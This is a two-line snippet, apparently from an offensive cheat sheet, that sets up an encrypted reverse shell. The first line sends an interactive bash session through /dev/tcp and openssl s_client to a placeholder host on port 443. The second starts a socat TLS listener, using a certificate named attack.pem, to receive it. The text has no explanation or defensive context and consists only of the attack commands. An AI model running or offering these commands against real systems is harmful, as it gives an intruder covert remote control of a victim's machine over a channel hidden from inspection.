bash -c 'bash -i >& /dev/tcp/IP/443 0>&1' | openssl s_client -quiet -connect IP:443
socat OPENSSL-LISTEN:443,cert=attack.pem,verify=0,fork -
